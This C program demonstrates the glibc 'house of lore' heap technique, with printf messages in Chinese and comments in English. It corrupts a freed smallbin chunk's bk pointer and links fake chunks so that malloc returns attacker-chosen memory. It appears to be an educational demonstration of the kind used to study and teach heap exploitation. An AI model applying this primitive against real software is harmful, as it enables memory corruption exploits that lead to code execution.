#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

struct small_chunk {
  size_t prev_size;
  size_t size;
  struct small_chunk *fd;
  struct small_chunk *bk;
  char buf[0x64];               // chunk falls in smallbin size range
};

struct small_chunk fake_chunk;                  // At address 0x7ffdeb37d050
struct small_chunk another_fake_chunk;
struct small_chunk *real_chunk;
unsigned long long *ptr, *victim;
int len;

int main(int argc, char * argv[]){

    len = sizeof(struct small_chunk);

    // Grab two small chunk and free the first one
    // This chunk will go into unsorted bin
    ptr = malloc(len);                              // points to address 0x1a44010
				printf("分配一个小块ptr: %p\n", ptr);

    void *dummies[7];
    for(int i=0; i<7; i++) dummies[i] = malloc(len);

    // The second malloc can be of random size. We just want that
    // the first chunk does not merge with the top chunk on freeing
    // malloc(len);                                    // points to address 0x1a440a0
    printf("再先分配一个小块, 以防止第一个小块在free的时候被合并到顶部块: %p\n", malloc(len));

				for(int i=0; i<7; i++) free(dummies[i]);

    // This chunk will end up in unsorted bin
    printf("释放第一个小块ptr\n");
    free(ptr);

    real_chunk = (struct small_chunk *)(ptr - 2);   // points to address 0x1a44000

    // Grab another chunk with greater size so as to prevent getting back
    // the same one. Also, the previous chunk will now go from unsorted to
    // small bin
    printf("分配一个较大的块, 从而引起ptr块从unsorted进入small: %p\n", malloc(len + 0x10));

				printf("将ptr与栈上的地址双连(将其bk指向假块)");
    // Make the real small chunk's bk pointer point to &fake_chunk
    // This will insert the fake chunk in the smallbin
    real_chunk->bk = &fake_chunk;
    // and fake_chunk's fd point to the small chunk
    // This will ensure that 'victim->bk->fd == victim' for the real chunk
    fake_chunk.fd = real_chunk;

    // We also need this 'victim->bk->fd == victim' test to pass for fake chunk
    fake_chunk.bk = &another_fake_chunk;
    another_fake_chunk.fd = &fake_chunk;

		  for(int i=0; i<7; i++) malloc(len);

    // Remove the real chunk by a standard call to malloc
    printf("新分配一块, 把smallbins链上的ptr块取走: %p\n", malloc(len));

    // Next malloc for that size will return the fake chunk
    victim = malloc(len); 
    printf("再分配取到假堆块: %p\n", victim);
}